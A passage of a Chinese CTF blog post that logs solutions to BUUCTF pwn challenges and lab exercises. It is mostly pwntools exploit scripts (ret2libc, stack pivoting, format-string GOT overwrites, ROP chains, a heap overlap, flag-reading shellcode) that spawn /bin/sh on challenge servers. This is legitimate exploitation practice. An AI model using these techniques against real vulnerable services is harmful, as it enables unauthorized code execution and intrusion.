+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+p.recvuntil(&#39;name&#39;)
+p.send(p32(sys)+p32(0)+p32(sh))
+#300
+one = libc_base+0x5f066
+leave = 0x8048511
+p.recvuntil(&#39;say?&#39;)
+
+p.send(&#39;a&#39;*24+p32(0x804a300-4)+p32(leave))
+#p.sendline(&#39;a&#39;*32)
+p.interactive()
+</code></pre>
+<p>这题说来惭愧,看名字 spwn 我以为是 srop ,吓得战战兢兢的做,结果就是个栈迁移,哎,太怂了~~~</p>
+<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><pre><code>from pwn import*
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+elf=ELF(&#39;./bjdctf_2020_babystack&#39;)
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./bjdctf_2020_babystack&#39;)
+p=remote(&#39;node3.buuoj.cn&#39;,28764)
+libc = elf.libc
+#libc = ELF(&#39;libc-2.23.so&#39;)
+p.sendlineafter(&#39;length&#39;,&#39;100&#39;)
+#gdb.attach(p,&#39;b*0x4006E6&#39;)
+p.sendlineafter(&#39;name?&#39;,&#39;a&#39;*24+p64(0x04006E6))
+p.interactive()
+</code></pre>
+<hr>
+<p>4.10 前劳动成果</p>
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><pre><code>from pwn import *
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./ciscn_2019_es_2&#39;)
+p = remote(&quot;node3.buuoj.cn&quot;,28704)
+elf = ELF(&#39;./ciscn_2019_es_2&#39;)
+libc=elf.libc
+pay = &#39;a&#39;*(32)
+p.send(pay)
+leak = u32(p.recvuntil(&#39;\xff&#39;)[-4:])
+leak = leak-228-4
+leave = 0x8048562
+#gdb.attach(p,&#39;b*0x080485FE&#39;)
+payload = p32(0x8048559)+p32(leak+12)+&#39;/bin/sh\x00&#39;+&#39;a&#39;*(40-12-4)+p32(leak)+p32(leave)
+p.send(payload)
+p.interactive()
+</code></pre>
+<p>第一次泄露栈地址,之后一个栈迁移</p>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
+p = process(&#39;./2018_rop&#39;)
+#p = remote(&quot;node3.buuoj.cn&quot;,28557)
+elf = ELF(&#39;./2018_rop&#39;)
+libc=elf.libc
+#libc = ELF(&#39;libc-2.27.so&#39;)
+got=elf.got[&#39;getegid&#39;]
+plt=elf.plt[&#39;write&#39;]
+pay = &#39;c&#39;*140+p32(plt)+p32(0x08048474)+p32(1)+p32(got)+p32(4)
+p.sendline(pay)
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;getegid&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+pay = &#39;c&#39;*140+p32(sys)+p32(0)+p32(sh)
+p.sendline(pay)
+p.interactive()
+</code></pre>
+<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
+#p = process(&#39;./level3&#39;)
+p = remote(&quot;node3.buuoj.cn&quot;,25480)
+elf = ELF(&#39;./level3&#39;)
+#libc=elf.libc
+libc = ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&#39;write&#39;]
+plt=elf.plt[&#39;write&#39;]
+pay = &#39;c&#39;*140+p32(plt)+p32(0x804844B)+p32(1)+p32(got)+p32(4)
+p.recvuntil(&#39;Input:&#39;)
+p.sendline(pay)
+real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = real - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+print hex(sh)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+pay = &#39;c&#39;*140+p32(sys)+p32(0)+p32(sh)
+p.sendline(pay)
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
+p = process(&#39;./r2t4&#39;)
+#p = remote(&quot;node3.buuoj.cn&quot;,27166)
+elf = ELF(&#39;./r2t4&#39;)
+__stack_chk_fail = elf.got[&#39;__stack_chk_fail&#39;]
+gdb.attach(p,&#39;b*0x4006B3&#39;)
+pay = &quot;%1574c%8$hnaaaaa&quot;+ p64(__stack_chk_fail)+&#39;a&#39;*20
+p.sendline(pay)
+p.interactive()
+</code></pre>
+<p>没啥说的,格式化字符串</p>
+<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><pre><code>#coding:utf-8
+from pwn  import *
+context(log_level = &#39;debug&#39;, arch = &#39;i386&#39;, os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p=remote(&#39;node3.buuoj.cn&#39;,26912)
+#p=process(&#39;./orw&#39;)
+
+shellcode=asm(&#39;mov eax,5;xor ecx,ecx;xor edx,edx;push ecx;push 0x67616c66;mov ebx,esp;int 0x80;mov ebx,3;mov ecx,esp;mov edx,0x50;mov eax,3;int 0x80;mov eax,4;mov ebx,1;int 0x80;&#39;)
+#open(&#39;flag&#39;,0,0) eax=5 ebx=esp ecx=0 edx=0
+#read(3,esp,0x50) eax=3 ebx=3 ecx=esp edx=0x50
+#write(1,esp,0x50)eax=4 ebx=1 
+#gdb.attach(p,&#39;b*0x804858A&#39;)
+recv = p.recvuntil(&#39;:&#39;)
+p.sendline(shellcode)
+flag = p.recv(100)
+print flag
+</code></pre>
+<p>这个不能太依赖 pwntools 自带的 syscall ,还是自己写最稳</p>
+<h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h2><pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+#p = process(&#39;./start&#39;)
+p = remote(&quot;node3.buuoj.cn&quot;,29590)
+pay = &#39;a&#39;*0x14+p32(0x08048087)
+#gdb.attach(p,&#39;b *0x08048087&#39;)
+p.recvuntil(&#39;CTF:&#39;)
+p.send(pay)
+leak = u32(p.recv(4))
+shellcode=&#39;a&#39;*0x14+p32(leak+0x14)+&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;
+p.send(shellcode)
+p.interactive()
+</code></pre>
+<hr>
+<p>4.11 日前劳动成果,目前排名 143 ,分数 331 ,现在开始看看堆,全忘光了~~~</p>
+<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><pre><code>from pwn import *
+#p = process(&#39;./fm&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,25972)
+payload = fmtstr_payload(11, &#123;0x0804A02C:4&#125;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>???</p>
+<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><pre><code>from pwn import *
+#p = process(&#39;./guestbook&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,25907)
+p.send(&#39;a&#39;*136+p64(0x400620))
+p.interactive()
+</code></pre>
+<h2 id="BJDCTF-2nd-test"><a href="#BJDCTF-2nd-test" class="headerlink" title="[BJDCTF 2nd]test"></a>[BJDCTF 2nd]test</h2><p>这题我一开始思路是把文件 scp 下来(<code>scp -P 27993 ctf@node3.buuoj.cn:/home/ctf/test /home/pic/Downloads</code>)用溢出的方式打,没想到几个命令就行??</p>
+<p>之后看了看网上的 wp 用<code>ls /usr/bin/ /bin/ | grep -v -E &quot;n|e|p|b|u|s|h|i|f|l|a|g&quot;</code>找到<code>x86_64</code> 和 <code>od *</code>两个命令能够</p>
+<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>这题和之前的太类似了,不写了,写一下之后得用万能 gadget 的</p>
+<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./level3_x64&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,29545)
+elf = ELF(&#39;./level3_x64&#39;)
+libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+plt = elf.plt[&#39;write&#39;]
+got = elf.got[&#39;write&#39;]
+#libc = ELF(&#39;libc.so.6&#39;)
+payload = &#39;a&#39;*136+p64(0x4006AA)+p64(0)+p64(1)+p64(got)+p64(8)+p64(got)+p64(1)+p64(0x400690)+p64(0)*7+p64(0x04005E6)
+p.recvuntil(&#39;Input&#39;)
+p.sendline(payload)
+
+#edi esi edx
+#  1 got   8
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+libc_base = off - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+#gdb.attach(p,&#39;b*0x400619&#39;)
+payload = &#39;a&#39;*136+p64(0x04006B3)+p64(sh)+p64(sys)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>万能 gadget 利用</p>
+<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./level4&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,26628)
+elf = ELF(&#39;./level4&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+plt = elf.plt[&#39;write&#39;]
+got = elf.got[&#39;write&#39;]
+#libc = ELF(&#39;libc.so.6&#39;)
+payload = &#39;a&#39;*140+p32(plt)+p32(0x804844B)+p32(1)+p32(got)+p32(4)
+p.sendline(payload)
+off = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+libc_base = off - libc.symbols[&quot;write&quot;]
+print hex(libc_base)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+#gdb.attach(p,&#39;b*0x400619&#39;)
+payload = &#39;a&#39;*140+p32(sys)+p32(sh)*2
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><pre><code>from pwn import *
+p=process(&#39;heapcreator&#39;)
+context.log_level = &#39;debug&#39;
+elf=ELF(&#39;heapcreator&#39;)
+libc=elf.libc
+def create(size,content):
+	p.sendafter(&#39;choice&#39;,&#39;1&#39;)
+	p.sendafter(&#39;Size of Heap&#39;,str(size))
+	p.sendafter(&#39;Content of heap&#39;,content)
+def edit(ind,content):
+	p.sendafter(&#39;choice&#39;,&#39;2&#39;)
+	p.sendafter(&#39;Index&#39;,str(ind))
+	p.sendafter(&#39;Content of heap&#39;,content)
+def show(ind):
+	p.sendafter(&#39;choice&#39;,&#39;3&#39;)
+	p.sendafter(&#39;Index&#39;,str(ind))
+def delete(ind):
+	p.sendafter(&#39;choice&#39;,&#39;4&#39;)
+	p.sendafter(&#39;Index&#39;,str(ind))
+
+free_got = elf.got[&quot;free&quot;]
+create(0x18,&#39;a&#39;)
+create(0x10,&#39;b&#39;)
+edit(0,&#39;/bin/sh\x00&#39;+&#39;a&#39;*0x10+p64(0x41))
+delete(1)
+create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
+show(1)
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+base = off-libc.symbols[&quot;free&quot;]
+sys = base+libc.symbols[&quot;system&quot;]
+edit(1,p64(sys))
+delete(0)
+gdb.attach(p)
+p.interactive()
+</code></pre>
+<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./ACTF_2019_babystack&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,29828)
+elf = ELF(&#39;./ACTF_2019_babystack&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.27.so&#39;)
+p.recvuntil(&#39;message?\n&#39;)
+p.sendline(&#39;224&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+got = elf.got[&#39;puts&#39;]
+plt = elf.plt[&#39;puts&#39;]
+payload = &#39;a&#39;*8+p64(0x400AD3)+p64(got)+p64(plt)+p64(0x4008F6)
+payload = payload.ljust(208)
+payload+= p64(stack)+p64(0x400A18)
+p.recvuntil(&#39;content&#39;)
+p.send(payload)
+off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+libc_base = off - libc.symbols[&quot;puts&quot;]
+print hex(libc_base)
+
+p.recvuntil(&#39;message?\n&#39;)
+p.sendline(&#39;224&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
+one = libc_base+0x4f322
+payload = &#39;a&#39;*8+p64(one)
+payload = payload.ljust(208,&#39;\x00&#39;)
+payload+= p64(stack)+p64(0x400A18)
+p.recvuntil(&#39;content&#39;)
+#gdb.attach(p,&#39;b*0x0400A18&#39;)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>常规栈迁移</p>
+<h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h2><pre><code>from pwn import *
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./oneshot_tjctf_2016&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,28491)
+elf = ELF(&#39;./oneshot_tjctf_2016&#39;)
+#libc = elf.libc
+libc=ELF(&#39;libc-2.23.so&#39;)
+got=elf.got[&quot;puts&quot;]
+p.recvuntil(&#39;location?&#39;)
+p.sendline(str(got))
+p.recvuntil(&#39;0x&#39;)
+base =int(p.recvuntil(&#39;\n&#39;)[:-1],16)-libc.symbols[&quot;puts&quot;]
+print hex(base)
+one = base +0xf1147
+print hex(one)
+p.recvuntil(&#39;location?&#39;)
+#gdb.attach(p,&#39;b*0x4006BB&#39;)
+p.sendline(str(one))
+p.interactive()
+</code></pre>
+<p>one_gadget 利用</p>
+<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><pre><code>from pwn import *
+#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./login&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,29037)
+elf = ELF(&#39;./login&#39;)
+libc = elf.libc
+p.recvuntil(&#39;:&#39;)
+p.sendline(&#39;admin&#39;)
+p.recvuntil(&#39;:&#39;)
+gdb.attach(p,&#39;b*0x400a4a&#39;)
+payload = &#39;2jctf_pa5sw0rd\x00&#39;+&#39;\x00&#39;*57+p64(0x400E88)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>这题属实没看懂,最后一点一点调出来的,看 wp 也看不太懂，自己敲了敲试出来了</p>
+<h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><p>这题很简单，就是送一个地址然后查看地址内容。然后我发现我真是有点呆，通过本地调试查看偏移量，发现偏移量不大。我就想本地爆破，我靠。。。发现自己真是逆向那边套路学多了，不行不行。看了 wp 发现是用 got 表，我怎么没想到~~~我真服了，而且这路走不通。函数限定地址大小小于<code>0x7fffffff</code></p>
+<pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+p = process(&#39;ret2lib&#39;)
+elf = ELF(&#39;ret2lib&#39;)
+libc=elf.libc
+got = elf.got[&quot;puts&quot;]
+shellcode = got
+p.recvuntil(&#39;:&#39;)
+p.send(str(shellcode))
+p.recvuntil(&#39;address : &#39;)
+plt = int(p.recvuntil(&#39;\n&#39;),16)
+libc_base = plt-libc.symbols[&quot;puts&quot;]
+print hex(libc_base)
+gdb.attach(p)
+sys = libc_base+libc.symbols[&quot;system&quot;]
+sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
+p.sendline(&#39;a&#39;*60+p32(sys)+&#39;\x01&#39;*4+p32(sh))
+p.interactive()
+</code></pre>
+<h1 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h1><p>这题我对 rop 又进一步理解了一下，一开始我还很自信，觉得直接 ropchain 直接甩就行，后来通过 ida 发现限制了字节数，真是一个字节不多。于是</p>
+<pre><code>from pwn import *
+from struct import pack
+context.log_level = &#39;debug&#39;
+io = process(&#39;simplerop&#39;)
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806e82a) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0) 
+p += pack(&#39;&lt;I&#39;, 0) 
+p += pack(&#39;&lt;I&#39;, 0x080ea060) 
+p += pack(&#39;&lt;I&#39;, 0x080bae06) # pop eax ; ret
+p += pack(&#39;&lt;I&#39;, 11)
+p += pack(&#39;&lt;I&#39;, 0x080493e1) # int 0x80
+io.recvuntil(&#39;:&#39;)
+io.send(&#39;a&#39;*32+p)
+io.interactive(
+</code></pre>
+<p>其实 ropchain 生成的明显有多余的，所以能够进行大范围的化简（23行&#x3D;&gt;6行</p>
+<h1 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h1><p>卡住了，昨天做梦都想这题，然后觉得这方法已经解决了，但是好像还是因为堆栈的问题执行 <code>system(&quot;/bin/sh&quot;)</code> 的时候死了，就很难受</p>
+<pre><code>from pwn import *
+context.log_level = &#39;debug&#39;
+io = process(&#39;migration&#39;)
+elf = ELF(&#39;migration&#39;)
+libc = elf.libc
+got = elf.got[&quot;puts&quot;]
+io.recvuntil(&#39;\n&#39;)
+io.send(&#39;a&#39;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got))
+sleep(0.1)
+real = u32(io.recv(4))
+base = real - libc.symbols[&quot;puts&quot;]
+one = base+0x3ac69
+io.send(p32(0)+p32(one)+p32(0)*8+p32(0x804A008+0x500)+p32(0x8048504))
+io.interactive()
+</code></pre>
+<p>一定要注意 bss 端得躲一块，不然最后起 shell 起不来，这个具体我还没研究，涉及到内核了</p>
+<h1 id="lab7（lab8同理"><a href="#lab7（lab8同理" class="headerlink" title="lab7（lab8同理"></a>lab7（lab8同理</h1><pre><code>from pwn import *
+from struct import pack
+context.log_level = &#39;debug&#39;
+io = process(&#39;crack&#39;)
+io.recvuntil(&#39;?&#39;)
+payload = fmtstr_payload(10, &#123;0x0804A048:123&#125;)
+io.send(payload)
+io.recvuntil(&#39;:&#39;)
+io.send(&#39;123&#39;)
+io.interactive()
+</code></pre>
+<p>pwntools nb 就完事了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/07/31/2020-07-31-buuctf/" data-id="cuidmyOWab5-rtW1FoyWo-Pbq" data-title="pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/10/2020-08-10-android/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Some Android Basics
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/31/2020-07-31-io/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">IO_file</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
